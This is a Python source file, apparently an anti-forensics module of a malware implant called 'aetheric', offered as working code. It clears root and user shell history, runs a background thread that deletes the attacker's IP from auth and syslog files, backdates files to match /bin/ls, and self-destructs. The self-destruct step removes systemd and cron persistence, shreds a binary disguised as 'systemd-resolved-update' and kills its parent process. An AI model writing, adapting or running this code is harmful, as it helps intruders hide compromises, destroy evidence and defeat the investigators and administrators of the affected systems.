"""
Anti-forensics: history wipe, log scrub, timestamp masquerade, shredding.
"""
import os
import subprocess
import time
import threading
import glob
from pathlib import Path

class AntiForensics:
    def __init__(self):
        self.attacker_ip = None  # set if known
        self.running = True
        self.scrubber_thread = threading.Thread(target=self._log_scrubber, daemon=True)
        self.scrubber_thread.start()

    def scrub_history(self):
        """Wipe shell history for root and current user."""
        cmds = [
            "unset HISTFILE",
            "history -c",
            "export HISTFILESIZE=0",
            "cat /dev/null > ~/.bash_history",
            "cat /dev/null > ~/.zsh_history",
            "cat /dev/null > /root/.bash_history",
            "cat /dev/null > /root/.zsh_history"
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _log_scrubber(self):
        """Background thread: remove attacker IP from logs."""
        while self.running:
            if self.attacker_ip:
                log_files = ['/var/log/auth.log', '/var/log/syslog', '/var/log/secure', '/var/log/messages']
                for logf in log_files:
                    if os.path.exists(logf):
                        subprocess.run(f"sed -i '/{self.attacker_ip}/d' {logf}", shell=True, stderr=subprocess.DEVNULL)
            time.sleep(60)

    def set_attacker_ip(self, ip):
        self.attacker_ip = ip

    def masquerade_timestamp(self, file_path):
        """Set file timestamp to match /bin/ls (or a common system file)."""
        try:
            ref_file = '/bin/ls'
            if os.path.exists(ref_file):
                stat_info = os.stat(ref_file)
                os.utime(file_path, (stat_info.st_atime, stat_info.st_mtime))
        except Exception:
            pass

    def full_wipe(self):
        """Self-destruct: remove persistence, shred binary, kill self."""
        self.running = False
        # Remove service/cron
        if os.path.exists('/etc/systemd/system/aetheric.service'):
            subprocess.run(['systemctl', 'stop', 'aetheric.service'], stderr=subprocess.DEVNULL)
            subprocess.run(['systemctl', 'disable', 'aetheric.service'], stderr=subprocess.DEVNULL)
            os.unlink('/etc/systemd/system/aetheric.service')
            subprocess.run(['systemctl', 'daemon-reload'], stderr=subprocess.DEVNULL)
        if os.path.exists('/etc/cron.d/aetheric'):
            os.unlink('/etc/cron.d/aetheric')
        # Shred binary
        binary = '/usr/local/bin/systemd-resolved-update'
        if os.path.exists(binary):
            subprocess.run(['shred', '-f', '-u', binary], stderr=subprocess.DEVNULL)
        # Remove pidfile
        if os.path.exists('/var/run/aetheric.pid'):
            os.unlink('/var/run/aetheric.pid')
        # Kill parent
        os.kill(os.getppid(), 9)
        # Exit
        os._exit(0)
